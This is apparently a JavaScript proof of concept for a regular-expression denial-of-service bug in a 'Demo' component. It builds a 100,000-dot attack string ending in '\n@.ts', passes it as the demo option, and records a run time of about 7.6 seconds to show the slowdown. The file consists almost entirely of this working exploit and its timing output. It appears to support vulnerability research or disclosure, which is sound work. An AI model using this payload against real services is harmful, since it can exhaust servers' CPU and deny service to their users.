import Demo from "./Demo.js";

//Attack String :""+"."*100000+"\n@"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += ".";
}
str += "\n@.ts";

const porps = {
  demo: "",
  demoOptions: {
    hideToolbar: "a",
    demo: str,
    defaultCodeOpen: false,
    disableAd: false,
  },
  disableAd: "",
  githubLocation: "",
  mode: "",
};

var result = Demo(porps);

// real    0m7.658s
// user    0m7.603s
// sys     0m0.023s

//注释了部分函数和所有导入
